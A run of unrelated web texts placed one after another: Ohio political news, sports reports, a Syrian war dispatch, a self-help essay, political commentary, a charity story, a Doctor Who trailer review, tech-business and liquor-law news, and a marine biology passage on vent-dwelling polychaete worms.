�It�s definitely confusing,� said Mike Murphy, a convention delegate and former chairperson of the Indianapolis GOP who was at the meeting. �A lot of the people who were going to go with Kasich in Indiana now feel really adrift� I think the deal was a mistake. It�s contrived and smacks of desperation.��
***
Kasich loses their hometown: On the campaign trail, Kasich often talks about their roots in McKees Rocks, Pa. But Kasich lost their hometown to Trump in Tuesday�s primary, Wehrman writes.
***
Where the governor is today: Kasich is campaigning in Oregon where their campaign released a new TV ad Wednesday.
�Wednesday morning saw the release of a new TV ad in Oregon, touting that rival �Ted Cruz pulled out of Oregon� and that Kasich �is the only one that can stop Trump and defeat Hillary Clinton in the fall,�� according to CNN. �The ad doesn't describe the agreement reached by the Cruz and Kasich campaigns that had Kasich pulling their resources out of Indiana, with Cruz doing the same in Oregon and New Mexico. The plan allows for each candidate to have a "clear path" to compete against Trump in those states."

On the countdown: 194 days until the general election.

Talk of Tiberi for Senate: It appears Rep. Pat Tiberi, R-Genoa Township, has their eye on the U.S. Senate, according to the USA Today�s Deirdre Shesgreen.
�He is very serious about exploring the possibility, and there are a lot of people out there encouraging them to do it,� said Jai Chabria, a longtime Republican strategist in Ohio who worked on Tiberi�s first congressional bid in the 2000 election cycle. �People around the state think he�d be a strong candidate.�
***
Public record problems? Ohio Senate President Keith Faber wants to help.
�Arguing that legal costs shouldn't stop Ohioans from gaining access to public records, (Faber) on Wednesday proposed giving people a low-cost recourse when records are denied,� Dispatch reporter Jim Siegel writes. �The bill seeks to address one of the biggest weaknesses of Ohio�s public records law � the ability of state and local entities to withhold public records without legal justification, knowing that the average person doesn�t have the resources for a court fight.�
***
Tax holiday coming to an August near you: �For Ohioans who liked shopping for clothes and school supplies during a three-day sales tax holiday last August, looks like the temporary tax break will return this summer,� Siegel writes. �The Ohio House voted 94-1 to reinstate the sales tax exemption for the first Friday-Sunday period in August, when parents and students are preparing to return to school. The bill is headed to Gov. John Kasich, who is expected to sign it.�
Who voted against it? Rep. Jim Butler, R-Oakwood, who said, �While it�s good for retailers � the overall impact on this is people are spending more because of this artificial period. They�re buying things that very likely are not made anywhere in this country, let alone the state. That means wealth is going out of our state.�
***
More medical marijuana talk: People struggling with illnesses told their stories in favor or legalizing marijuana at press conference Wednesday.
�Ohioans for Medical Marijuana spokesperson Aaron Marshall said 300 volunteers and a team of paid circulators already have gathered tens of thousands of petition signatures toward a vote on making Ohio the 25th state to legalize medicinal use. The group needs 305,591 valid signatures by July 6 to qualify for the ballot,� Dispatch reporter Randy Ludlow writes. �The group is critical of a bill pending in the Ohio House of Representatives to legalize medical marijuana, citing �numerous shortcomings� that it says will create hardships for physicians, patients and caregivers.�
***
Of note: �Scott A. Zody, a former chief of the Ohio Department of Natural Resources' Division of Wildlife, is being remembered as a dedicated public servant,� Dispatch reporter Mary Beth Lane writes. �Zody, 50, was found dead on Wednesday at their home near Sugar Grove, south of Lancaster. It appeared they died of natural causes, a county official said.�
***
On this day: According to the Dispatch library, on this day in 2000, �A state law requiring that communities be notified when sex offenders move is ruled constitutional by the Ohio Supreme Court. The unanimous decision reverses a ruling by the 11th District Court of Appeals in northeastern Ohio, which had said requiring notification of communities when a convicted sex offender moves in violates the offender's right to privacy and leaves little room for further challenge.�

Southampton have joined West Ham in the race to sign Besiktas winger Gokhan Tore according to the Sabah newspaper.
The report claims that the Saints are preparing a £7 million bid for the explosive winger.
West Ham have been locked in talks with Besiktas over the transfer of Gokhan Tore since the start of the transfer window but have yet to agree a transfer fee.
The Hammers made a loan offer with a buyout clause option but Besiktas have made it clear that they want a transfer fee on a permanent deal if Tore is to leave the club.
Besiktas want at least £13 million for the explosive winger who still has another two-years remaining on their contract.
The Turkish international does have Premier League experience having risen through the Chelsea ranks before their move to HSV and then Rubin Kazan before joining Besiktas.
Tore established themselves as one of the most highly sought after players in the league under the flight attendantship of Slaven Bilic who coached Besiktas for two seasons before taking over at West Ham.

DAMASCUS, Syria — While most Syrian areas have been under a cease-fire since Feb. 27, fighting has been raging between the Islamic State (IS) militants and the Syrian regime forces following the IS attack on the villages to the north of Hama's eastern countryside that same day. The official Syrian news agency, SANA, reported on that day the “death of six people in a car bomb by IS at the entrance of al-Salamiyah.”
In another report, SANA reported, “The Syrian army managed to circumvent IS' attacks on many of the areas under the army's control.”
IS' attack on the eastern countryside of Hama comes as a reaction to the Syrian forces' progress on the Salamiyah-Athriya axis all the way to the administrative border of Hama and Raqqa. The Syrian army launched its operations from the area of al-Salamiyah in the Hama countryside 30 kilometers (19 miles) east of Hama on Feb. 10, according to Jamal Hazouri, a war correspondent accompanying the Syrian army forces who talked to Al-Monitor via Skype.
“The Syrian army has managed to secure the desert highway from al-Salamiyah area all the way to the village of Athriya, linking al-Salamiyah-Raqqa road to al-Salamiyah-Khanasir-Aleppo road. It is the only land route under the control of the Syrian army, linking the southern regions under its control to the northern areas,” they said.
Hazouri added, “The Syrian army started advancing from the town of Athriya toward the southeastern countryside of Raqqa to the village of Zakia, located on the administrative border of Raqqa. The town is seen as a strategic location to the north of the road from Athriya leading to the cities of Tabqa and Raqqa, where IS is located on the other side [of the road]. This is a strategic location linking the provinces of Hama, Raqqa, Deir ez-Zor, Aleppo and Homs.”
Hazouri confirmed that the Syrian regime's forces were able to control al-Masbah hill in addition to three other hills to the side of Zakia. They said, however, that the regime forces have been targeted by dozens of car bombs and missiles on the Raqqa-Athriya axis in an attempt on the part of IS to stop their progress.
In terms of the forces participating in the battle alongside the Syrian army, they noted that hundreds of young people from the tribes of Raqqa and Deir ez-Zor are taking part in the battle, fighting under the banner of the national defense forces. These forces consist of a militia formed by the regime to include young volunteers, be they Syrians or foreigners. They have been fighting alongside the army since the beginning of 2013.
Hazouri believes that revenge played a major role in the raging battle, as Syrian soldiers and the tribes' young men fighting alongside the regime army are using this battle to avenge many of their comrades and friends who were killed at the hands of IS at Tabqa military airport on Aug. 28, 2014, following IS taking control over the airport, and to extract retribution for massacres IS has committed against Syrians.
On the importance of the regime's military campaign, retired Syrian Brig. Gen. Aktham Abu Hamdan told Al-Monitor that the Syrian regime forces' advance toward the town of Zakia threatens the existence of IS in the southern countryside of the province.
Hamdan told Al-Monitor in Damascus, “The Syrian army's control over the town of Zakia and its surrounding hills will allow its troops to have within their range of sight large areas of the Raqqa countryside."
They explained that this would mean that "the regime forces would be able to implement their maneuver warfare and would turn machinery and vehicles into easy targets. Given that the battle is now waged in open spaces, any possible direct clashes between the Syrian army and IS fighters in the near future is virtually impossible. This is why the Syrian army is primarily relying at this stage on remote and medium-range heavy weapons.”
Hamdan believes that Feb. 4 statements by the military adviser in the Saudi Ministry of Defense office regarding a military intervention to fight against IS contributed to the Syrian political leadership's decision to launch the battle near Raqqa to prevent any Saudi ground military intervention. They said the Syrian regime, backed by Russia, seems to be in a race against time with the United States and its Kurdish allies to launch the battle for Raqqa.
“The Syrian regime does not want the Kurds to control Raqqa despite their military alliances, since it fears the Kurds will exploit their control over the area extended from Ain al-Arab region [Kobani] eastward to Afrin in the west, and the establishment of a self-rule region in the future,” Hamdan said.
On whether they expect the Syrian regime to advance toward Raqqa in the near future, Hamdan said they do not think the battle will develop beyond this point, and the two parties will remain in a state of advance and retreat in a narrow space between the countryside of Hama and the countryside of Raqqa, noting that IS will not allow the Syrian army to easily advance in the regions under its control.
IS did not take the Syrian army's breach lying down. The organization's forces attacked Khanasir town Feb. 23 and tightened their grip on it, thus blocking the only road to northern Syria that is under the regime's control and that passes through Athriya-al-Salamiyah front, the main starting point for the regime toward Raqqa's countryside.
A leader from the national defense forces participating in the battle told Al-Monitor over Skype on condition of anonymity, “On Feb. 22, we advanced toward Zakia village and controlled several spots. We also advanced toward Marina Mountains. We are closer to opening the road to Tabqa city. But IS' attack on Khanasir distracted the fighters and increased pressure on our forces, especially since its attack coincided with a violent counterattack on the Zakia-Athriya front.”
Regarding the next steps, the same leader in Athriya said, “Our operations will continue along the Athriya-Raqqa axis, and our forces will secure the road from Athriya to Khanasir. The Russian air force will protect the two forces [on the Athriya-Khanasir and Athriya-Raqqa axes] against any attacks that might risk us losing the regions we retook.” The Syrian regime managed to regain control over the town of Khanasir on Feb. 25.
Abdel Rahman Daoud, a political analyst close to the Syrian regime, told Al-Monitor, “The Syrian army will stand its ground in the Raqqa battle because regaining the province is an important step to eliminate the danger of division, and because the Russian leadership wants to block the way to any US attempt to control IS' main stronghold amid the public field race between Russia and the United States.”
The Raqqa battle is still relatively far away if we look at it from the perspective of distances that the Syrian army would have to cross. But from an ambitious perspective, it has become imminent. IS has blocked the road the Syrian regime would need to cross to reach the north of the country. This might make the regime's ambitions harder to fulfill.
November 19th, 2011
One more of the traits I referred to and read about recently in “The Good Among the Great” that I wanted to explore in more detail is Performance and Process Oriented. I especially value the performance oriented and while I know the process piece is associated with that, to me it is a subset of performance. This article explores how to put performance as a focus in much of what you do.
Work for Joy and Not for Money
Performance occurs when you are happy doing the job you do. Study after study shows that money does not bring happiness to life or a workplace and so you have to find joy in what you do to truly perform at your best. Finding ways to enjoy your work are important regardless of what you do with your used cell phones. At the same time, I don't think you need to quit your job or find a new career that is more satisfying just to have a joyous reason to work. Every job has its joys or satisfactions and it requires the person doing them to discover them. In whatever job you do, you can either choose to complain about it (which many people seem to do in work) or you can find ways that you can value the work, the results you get and make the job more enjoyable. Perhaps this is through the people you work with, adding some humor or fun to the culture, making some friendly competition or self challenges to make the work more than just showing up for a pay check. If you don't enjoy your job now, ask yourself, “Will it really make a difference to liking your job if you get a 10% raise?” Probably not, however, it will make a BIG difference if you can positively change the culture, make work more fun, know and have fun with the people you work with or simply love the results you can produce in that job. The great part of having more joy in the workplace, is that you will still end up having better performance which will always lead to that better pay in the long run anyway.
Value The Journey more than The Achievement
Being performance oriented often leaves people solely focused on a outcome instead of truly optimizing the process or journey towards that achievement. While obviously results are an important aspect of any performance oriented person, they are not the only thing that matters. The methods, the journey and the process used to get to that outcome is often more important since it is where the learning occurs along the way. The journey is where the experience is really coming from, not the end result and that experience is what you will remember and be able to repeat. If you achieve something and don't know how you achieved it, does it really have any value?
Study The Results of Everything You Do
So, if you look at the journey or your performance and not only the results, it helps to pick apart the results and examine them to help uncover the truths of why they work or how you got them. Of course the journey is part of this to know the process and methods, but the results are often not as obvious as they might seem at first either. What impact does the result actually have? Does the result reach other people, other areas or aspects of that job that you didn't intend at first? Are those positive or negative results? What about the repeat-ability of your results, is there someone else who you could teach or help achieve the same thing? Can you repeat them yourself?
Reflect on Your Talents and How to Use Them
Something leads to great results and sure the journey is part of that, but often that journey is shaped by a talent that you have. Do you know what your greatest talents are and is it clear to you when you are using them and how to make them more effective? Being performance oriented will require you to use all of your skills and talents. Reflect on them to figure how you can use them more? You are way better off spending your time on your strengths and talents than you are on weaknesses when you are looking to be performance oriented. Weaknesses may be an area you want to improve on to help get results, but every hour spent using a talent will always get you more than an hour spending working on a weakness. That is exactly why you would call it a weakness in the first place, you are not as good at it!
Learn From your Mistakes
I am amazed how many people seem to be afraid to make mistakes, want to hide mistakes they do make, and don't seem to tolerate others making mistakes. These are not the behaviors of performance oriented people, as hiding and avoiding mistakes is something that limits people from learning from them. Obviously making mistakes on purpose is not valuable here, but tolerating mistakes for what they are and then maximizing them by learning from them is incredibly valuable. Ask yourself why the mistake happened? Can you avoid it from happening again? What did you learn from the mistake and can you share that or teach it to others?
Create Experiences Over Acquiring Things
The materialism and disposable world we have created is shifting people more and more towards what they want instead of why they want it. Acquiring things is often at the top of people's goal lists or wish lists and it happens more and more as people achieve more. To be truly performance oriented however, one has to care more about the experiences they gain and wish for over the things they might be able to acquire. Every thing (even a status item or symbol of prestige) is still for the purpose of the feeling it gives the person. That is even more true with experiences that don't come with some item or thing. The stuff we accumulate often holds us back from being able to do and experience more. If you want to be more performance oriented, you must think about and shift from acquiring things to creating experiences. It is the experiences you will remember and value years later and its the experiences you can share with others on a personal level.
Change What Doesn't Work Quickly
Many people get their mind set on something and keep being persistent, without exploring new options. Persistence has its merit when it is the only option to accomplish something (like my article on perseverance climbing a mountain) but most of the time there are alternatives choices and methods to get a similar result from. This is why it is good to react when something doesn't work and to change it before wearing yourself out or wasting too much time on the wrong thing. If you can change something that is not working quickly for another method, this is much better than just continually pushing through when there is tiring resistance (either skills, circumstance, etc). Optimizing the way to get results is important to do at all times, so change what doesn't work quickly and you will certainly find the optimal path and be more performance oriented.
Kill Distractions and Find Solitude
Distractions seem like they have become part of everyday life now for most people but the truth is that they are chosen by people and it is quite possible to choose to eliminate distractions just as easily as it is for people to choose to have them. Whether it is how many times a day you check your facebook page, whether or not you stop a personal conversation to answer a phone or simply how you fill your productive and spare hours with extra things like music, a bit of web surfing or checking your email 25 times a day; all of these are distractions you choose to have or allow. If you want to be more productive identify the distractions that don't help you and choose to kill them. Maybe for an hour to start, a day or if you are determined, forever, but no matter the time frame you have to choose to kill the distraction to gain performance. Combine that with some solitude where you can actually think about your life and the things you need to accomplish and you suddenly find yourself more performance oriented with an ability to get a lot more done in the same period of time.
Take Risks and Ignore Conventional Thinking
Performance oriented individuals are those who are willing to take risks and they know that a risk is often necessary to take a leap forward instead of always playing everything safe and conservative. Often conventional wisdom or wisdom of crowds forces conventional thinking that keeps us from trying something new, being creative or experimenting with some idea that might fail. Without the guts to take the risk, we limit every possibility of it working and kill what might have turned out to be an amazing ideal if only it was acted on.
Relationships Must Come First
Last but certainly now least in this list of being more performance oriented is relationships. Relationship are absolutely crucial to great success and are one of the strongest areas to help accelerate and connect a person for success. Whether it is for support and empathy from people we know, trust and love, or connecting businesses and networks of business people towards win win situations, no matter what the performance you are after, relationships will help it come faster, make it easier to enjoy and share, and empower you with more passion and emotion than when others are not involved with you.
Prev: 17 Ways to Be More Realistic Next: Learning to Say No
Rolling Stone magazine has published an editorial endorsing Hillary Clinton written by the prominent historian Sean Wilentz of Princeton University. Wilentz, reportedly a long time friend of the Clintons, praises Hillary in the strongest terms, saying they would "carry on the Democratic Party's progressive traditions and transform America." Wilentz goes on to give a highly selective account of what President Hillary Clinton would offer America.
My Gut Reaction: I suspect that Wilentz has a slightly different definition of progressive than I do.
More below the fold....
The most striking aspect of Wilentz's hagiography of Clinton is how little depth it really has. Although they describe a few of their political positions, they do not go into any detail about their real import for America. Disturbingly, in cases where the legacy of the last Clinton presidency is problematic or embarrassing, they either ignores the suffering caused or tries to portray it as unavoidable. For example, in describing the welfare reform enacted by Bill Clinton, they write:
The left vilified them for signing a welfare-reform bill that they themselves knew was severely flawed and would later try to correct - but which did help move millions into paid employment, instead of what FDR called "the pauperism of the dole."
At one point, Wilentz waxes lyrical about the representation of African American at the Democratic National Convention, writing, "The convention hall was a sea of brown and black and white faces as well as LGBT rainbows." However, the welfare reform they endorse several pages later has been found to have had a disproportionate effect on African Americans, despite the fact that black people make up less than a third of welfare recipients. Furthermore, as Michelle Alexander has argued, the Clintons have contributed mightily to the mass incarceration which plagues minorities in this country:
If anyone doubts that the mainstream media fails to tell the truth about our political system (and its true winners and losers), the spectacle of large majorities of black folks supporting Hillary Clinton in the primary races ought to be proof enough. I can't believe Hillary would be coasting into the primaries with their current margin of black support if most people knew how much damage the Clintons have done—the millions of families that were destroyed the last time they were in the White House thanks to their boastful embrace of the mass incarceration machine and their total capitulation to the right-wing narrative on race, crime, welfare and taxes. There's so much more to say on this topic and it's a shame that more people aren't saying it. I think it's time we have that conversation.
Even more disturbingly, Hillary Clinton's continued espousal of a militaristic foreign policy is nowhere to be found. At no point does Wilentz deign to consider the Americans who died fighting in Iraq after Clinton voted for war, nor do they consider the hundreds of thousands of Iraqis who died in that conflict. One can only conclude that Wilentz elected to avoid this issue because they had no real defense to offer.
There are many one who wants to be an entrepreneur and create jobs, but very few of them will be able to think on basic things like feeding someone. Everyone is looking for a better job which suits them, but what for those who don't even have money to even eat. Padmanaban Gopalan & their 2 friends Sudhakar & Dinesh have focused on the basic thing such as hunger. They have started an initiative called No Food Waste. They collect excess food from events like weddings, Parties, etc. & distribute it among hungry people in Coimbatore.
These city boys are actively working on this since Oct. 2014. They collect excess food from hotels, weddings, parties, etc that could be packed & give to the hungry in Coimbatore. Earlier when they asked for sponsors then people are not taking them seriously. They just ignored them, but they will continue their work to feed hungry people.
One day they got to know about a US based NGO, Pollination Project & they applied there. And fortunately they are among those four finalists who are selected within 150 projects who are working on human rights, social justice, animal advocacy, environment, arts activism & women's rights; wrote Ari Nessel, founder & director of pollination project. The voting closed on 17 July & there hard work pays off. They are the winner of that pollination project only based on public voting. They won by 4000 votes. Padmanaban said that they got to know about this funding through a friend & applied for it. They won $1000 as funding to proceed there good work further. They have now launched a Zero Hunger Hours Campaign on World Food Day i.e. on 16 October between 12:30 PM to 01:30 PM, when they would feed several hungry people.
They have already written to various international NGOs to make it a global phenomenon & they are getting positive responses. Previously they used to spend their own funds for packing & transporting the food, but after winning this award their work becomes easier. The team is planning to expand their project to Tirupur, Erode, Salem, Dharmapuri and Krishnagiri.
Soon they are planning to launch a mobile application that helps people to look for locations where extra food could be donated. Map & GPS system is also in that application to guide people to show 100 spots where excess food could be delivered. They are launching the Application & Zero Food Hour Campaign on 2nd October. The idea is to stop wasting food & give it to the needy. Meanwhile the team is trying to communicate to the city corporation to extend it to all the wards & zones. Padmanaban said that if the civic body provides them land where food can be stored in cold storage then it will be much easier for them to transport food. And more people will know that where to give there excess food & this helps to create more awareness.
Don't waste your food, donate it. An initiative can change the world.
The BBC only went and released another trailer for Doctor Who is a Series 9, they must have loved my previous analysis so much they wanted to give me more delicious frames to look at and make hasty judgements… And look at that, I've learnt how to use permalinks 🙂
Starting off in the TARDIS, they're just showing off now they've got more Roundels about the place. They had better open up the set to tours again soon…
The Doctor rushes in, wearing a red velvet jacket. Filming pictures suggest this jacket is worn during episode 10.
“Sorry I'm late” Talking to your ship again Doctor?
Reusing a shot of TARDIS flying through space from the first trailer.
“He hasn't got a plan yet, but they will have. And it will be spectacular”
Clara seen in episodes 4/5 with Maisie Williams (character name unknown). This again backs up the theory episodes 4 and 5 are going to be ‘Vikings in Space'. They're watching The Doctor:
And The Doctor is looking up at something… A spaceship taking off perhaps?
A clear view of the robot guards glimpsed in the first trailer. Again from the Viking episode, and I said in my previous analysis how much I love this design.
Backing The Doctor and Clara into a corner, with what appears to be a Viking Warrior behind them. Horns on the helmet? HISTORICAL INACCURACY ALERT, CODE RED, AWOOGA AWOOGA ADANDON SHIP.
GUNS! Those big robot chaps have guns, because what sort of giant killer robot would they be without a laser.
Corridor time once again for The Doctor. Nice to see we've still got some familiarity left in the show.
*DRAMA ZOOM*
Okay, first of all, a dragon in a Viking house is quite cool.
Second of all, the CGI on this thing is POOP! Watching it in the trailer makes me think they gave The Mill the day off and hired a four year old with their parent's iPad.
The eerie hands seen rising from the mud last time, now have eyes… Anyone else having flashbacks of Pan's Labyrinth.
Joivan Wade returns as Rigsy! Yes the character that everybody saw and went “Meh he'll do I suppose” It's been confirmed already he's appearing in episode 10 alongside that red velvet coat P-Cap has got himself.
And that sign behind them is too blurry to read, but there is a great big ‘Congestion Charge Zone' logo. So either this in set in central London or continuity messed up.
Zygons galore in episodes 7 and 8. And is it just me or does the background here look like Boat One? That aeroplane UNIT used to hold Missy and The Doctor last year…
Clara channels Gwen Cooper in that poop fourth Torchwood series with a great big gun. I should really use gifs to show scenes like this with them assembling the gun from a case, but I'm not skilled enough to create gifs.
Maisie Williams with some sort of… alien fortune teller perhaps? That looks like a lion? And where on earth is Maisie getting red lipstick from in Viking England?
This city, yup this time it's definitely on Skaro. Watch ‘The Dead Planet' the first Dalek story EVER to understand why this city is significant.
They're too small to see on the screenshot, but loads of Daleks are floating up out of this city. Too small to tell which Dalek aesthetic is visiting Skaro. And you'll see why aesthetic is important later.
This to me looks like, a teleport pod. In a monastery.
The evil sea creature bloke from the first trailer brings a tsunami. According to someone on Twitter this was filmed in an army base about 30 minutes outside of Cardiff.
Clara is spooked, and pulls out a knife to defend themselves from…
Missy! Michelle Gomez keeping the slightly deranged Mary Poppins nemesis we saw last year. She's wearing a Vortex Manipulator on their wrist, I wonder what Jack would think of this?
The Doctor in their red velvet jacket crouching, perhaps hiding from something.
Not hiding very well then Doctor. A hand appears to pull them down. I think this is the sea creature's hand.
Exiting the TARDIS, good to know he's still doing that.
Daleks! Lots of lovely Daleks. Some Time-War era drones, a Davros New Empire Supreme, a Time-War Black Dalek, on the balcony we see a ‘Destiny of The Daleks' style Dalek, and peeking in the back is an ‘Evil of The Daleks' Emperor Guard.
And not a ‘Power Ranger' New Paradigm Dalek in sight. That is fantastic news.
Daleks have captured a scared looking Clara, *begins chanting ‘KILL HER' as loud as possible*
A shadowy figure in a shadowy corridor. Nope, I've got nothing.
The figure up close, channelling Darth Maul.
This one was seen in the last trailer, here he's forming out of thin air so yeh. This is the sea base episode, with ghosts…
From what I remember of last trailer's analysis, I decided this bloke was from the planet Karn.
A Viking Warrior with two robot guards. If my hunch is correct this character is Odin, originally planned to be played by Brian Blessed before they dropped out. Now it's David Schofield playing the Norse God.
Again I realise I need to use gifs in these analyses. P-Cap riding a horse just like in their first episode.
Ugly sea creature clear shot to terrify the children? Check.
“Here and now, this is where your story ends.” Let's hope P-Cap gets more ‘I AM THE DOCTOR' speeches to defeat the baddies.
EXPLOSIONS! EXCITEMENT! PROBABLY VIKING EPISODE!
The Doctor and Maisie run away from some explosions, with the alien lion soothsayer visible too.
Where IS Maisie getting this lipstick from? And how many hairdressers were there in Viking times?
Osgood seen here running towards a Police station. Odd architecture too, it seems Spanish…
She's running away from a Zygon, of course they are. I really hope they give us a decent explanation how Osgood is still alive.
The fans said last time they wanted more of the guitar scene, so they gave us the same scene again! Genius.
Michelle Gomez here doing their best interpretation of Roger Delgado in the last episode of Frontier in Space. Does anyone get that reference?
The same shot from the first trailer of The Doctor and Clara running down a sea base corridor.
The lion breathes fire!
P-Cap with their red velvet jacket jumping out of a window. The curtains could be anything, not much to see here.
If P-Cap says “I wear sunglasses now, sunglasses are cool” I will go to BBC Wales and punch Moffat square in the face.
“What is happening?!”
Oh that shot is gorgeous. Some time-war era golden Daleks and a black supreme, the Davros New Empire Red Supreme, a couple of Troughton Era Emperor guards and tucked away at the back, THE SPECIAL WEAPONS DALEK! My favourite Dalek of them all. It seems we are finally getting ‘every Dalek ever'.
Also, my good friend Neil on Twitter suggested this room with it's triangle walls and supports looks a lot like the original control room in the very first Dalek story. Yet more confirmation we've finally returned to the Dalek City that started it all…
“Same old. Just The Doctor and Clara Oswald in the TARDIS!” So they wear the sunglasses when confronting The Daleks
Back with the UNIT boys, either there's a heck of a lot happening in one episode of P-Cap keeps the sunglasses all series.
Oh no, I can hear Tumblr turning this into a gif and ‘shipping' as I type…
You people see love here? I don't. Clara loves BEING with The Doctor (as any normal person would). They don't love The Doctor and they don't love them They need to leave and never come back. A death would suffice but then they might end up with ‘Adric' levels of remembrance.
So there we are. Somewhat less exciting than the first trailer, but some very cool scenes shown. And I want that Dalek scene as a poster.
Thanks for reading, this took several hours 🙂

Icelandic computer game company Plain Vanilla, creators of QuizUp, is shutting down their office in Iceland and all 36 employees have received a redundancy notice.
In a press announcement, Plain Vanilla explains that following the decision by NBC to cancel the production of the QuizUp television show, the basis for operations fell through.
Plain Vanilla further states that 2016 saw major changes in Plain Vanilla's operations – but while revenue increased greatly, the cost of maintaining the community of users within the game was so high that the company began to lose money. According to Þorsteinn B.Friðriksson, managing director of Plain Vanilla, the e-mail from NBC was totally unexpected.
"As somebody once said, that's Hollywood. We've learned an incredible amount from all this but needless to say, it was a great shock." They add that the company's investment plans had therefore faltered as they were expecting the revenue from the show. "We saw that we had no other choice but to close the company in Iceland."
The first episode was to be aired on 5 March 2017, and Plain Vanilla employed a team of fifteen people in Los Angeles to work on the episodes with the NBC. Asked by mbl.is whether they will be considering some sort of compensation with regards to the amount of time and investment in the project, Friðriksson says that they are looking into it.
Plain Vanilla will be continuing with the development of QuizUp despite closing down their Iceland offices.
80 million people have downloadaed QuizUp with 20,000 new users every day. Plain Vanilla Games created 100 tech jobs at one point and raised over $40 million from US venture capital investors, most notably Sequoia Capital, IDG Ventures, Greycroft Partners, and Boldstart Ventures.
Most recently, the company received $7.5 million investment in the from of convertible note from Glu Mobile in January 2016, the publisher behind Kim Kardashian's mobile app.

Salt Lake City doesn't exactly have a reputation for being one of the hipper cities in the United States, but apparently even the people who are actively trying to introduce a little good-natured fun to Utah can run into a fair amount of trouble. That's the lesson that a Salt Lake City theater named Brewvies recently learned when it had the nerve to serve alcohol during a screening of Deadpool, which happens to be rated R. Brewvies has been hit with a violation by the state's Department Of Alcoholic Beverage Control, and is now facing a fine of up to $25,000 and a 10-day suspension of its liquor license.
This comes from the Salt Lake Tribune, which helpfully explains to any non-Utahns that the state has a law on the books preventing “the showing of films, still pictures, electronic reproductions, or other visual reproductions depicting sex acts, simulated sex acts, genitals,” and “etc.” in places where alcohol is served. Deadpool, a movie where the main character literally cuts off their hand at the wrist, also happens to include a montage where Ryan Reynolds and Morena Baccarin have a number of holiday-themed sexual encounters, or as the DABC puts it, “male and female characters are shown having sex while nude.” The DABC investigation was conducted by three undercover agents who were given the unenviable task of ordering some beers and watching Deadpool, and their report also notes that there is a scene during the end credits in which an animated Deadpool rides on the back of a unicorn and “rubs its horn briefly until the horn shoots out rainbows (simulating orgasm).”

Brewvies—which was hit with a similar fine when it served alcohol during a showing of The Hangover Part II—is fighting this, with the theater's attorney (and former Salt Lake City mayor) Rocky Anderson pointing out that the Deadpool showing is protected by the First Amendment. Therefore, they say the DABC cannot legally restrict how the movie is shown, whether alcohol is present or not. They also reference a court case regarding alcohol being served where “topless and bottomless dancers, nude entertainers, and films displaying sexual acts are shown,” but they claim the two cases are “universes apart” since Deadpool is “still being shown throughout the state, and is receiving extremely positive reviews.”
Media playback is not supported on this device Highlights: Lincoln City 3-2 Oldham Athletic
National League side Lincoln held on to shock League One strugglers Oldham and reach the third round of the FA Cup for the first time since 2010.
The Imps, who have not lost since 24 September, took the lead through Theo Robinson's close-range header.
Terry Hawkridge slotted in the second shortly after, and Robinson chipped in to make it 3-0 after the break.
Peter Clarke and Billy McKay scored to give Oldham hope, but they could not find a late equaliser.
Cameron Burgess came closest to levelling the scores, planting a free header wide of the target.
Lincoln, who are second in the National League, will now face a trip to Championship side Ipswich in the third round, which takes place on 6-9 January 2017.
They last made it to the last 64 in the 2009-10 season, losing 4-0 to Bolton, then of the Premier League.
Two-goal hero Robinson, released by Port Vale at the end of last season, had been a free agent until 8 October, when Lincoln boss Danny Cowley signed them on a short-term contract.
Oldham, who are 23rd in League One, have now failed to win in five matches in all competitions.

'Premier League' mentality made the difference
Lincoln manager Danny Cowley paid tribute to the club's fans after the game, saying the 7,012 supporters in the ground "carried" their side to the win after conceding two quick goals.
"For us to have over 7,000, it's beyond all of our wildest expectations," they told BBC Radio Lincolnshire.
"I think credit goes to the players, because they've got people in the city believing again
"We said it in the dressing room that they might have League One player, but we've got Premier League people.
"We've got proper people, proper characters and they dug in when it really mattered."
We focused on the unique coastal vent ecosystem of Ischia island (Italy), where underwater CO 2 volcanic emissions interact with a seagrass and rocky reef habitat1. CO 2 bubbling from the seafloor drives the seawater pH down to equal to or lower than business-as-usual IPCC projections for 2100 (pH 6.5–7.81,2), effectively creating a “chemical island” approximately 2,000 years old3. Our biological focus is on polychaete worms, as they are an abundant taxonomic group in the vents1. Their consistent vent-dominance and the trends seen in their seasonal abundances indicate the possibility of either multi- and/or transgenerational exposure4,5,6,7. Furthermore, the group exhibits highly diverse reproductive and developmental modes8.
We related the type of early life history strategies employed by species living in the vents with their known distribution and abundances1,5,6. We found twelve of the total thirteen species with known reproductive characteristics colonizing high CO 2 vent areas to be brooding or direct developers (eggs kept in protected maternal environment/no free-swimming larval phases). Ten had higher abundances in the venting areas than in nearby ambient CO 2 areas (Table 1). The exception was one species, morphologically appearing to be Platynereis dumerilii (Audouin & Milne-Edwards, 1834), the only broadcast spawning pelagic developer with higher abundances in the vents5,7,9.
Table 1: Early life-history strategies of all polychaete species present in the lowest pH vent site. Full size table
The observation that brooding polychaete species dominate the CO 2 vent areas, along with evidence for physiological and genetic adaptation in vent-inhabiting Platynereis dumerilii6, prompted further examination of this particular species. To determine whether these adaptations have led to reproductive isolation, we attempted to crossbreed Platynereis individuals collected from within the vent sites with those collected from control sites outside the vent sites, in the laboratory.
A male from the control population in the initial stages of transforming into a pelagic, swimming reproductive P. dumerilii was introduced into a container with an immature adult Platynereis sp. from the vent population. Within two hours, the male prompted this vent-originating worm to develop large yellow eggs, likely a pheromone-induced response between the two sexes10. These eggs filled the female body cavity and were five times larger than the average P. dumerilii eggs. The female proceeded to build a complex tube structure consisting of inner microtubes where they deposited large, fertilized eggs that immediately stopped developing (Fig. 1).

Initial cross-breeding activity with (top) Platynereis dumerilii male transforming into a pelagic, swimming epitoke full of sperm and (below) the Platynereis massiliensis female developing large yellow yolky eggs, (250 μm in diameter); b. Female inside tube laying and moving 74 eggs into inner brood tubes after 12 h of pairing with the male; c. Close-up of inner-parental mucus tubes holding large yellow eggs. Scale: 0.5 mm. Full size image
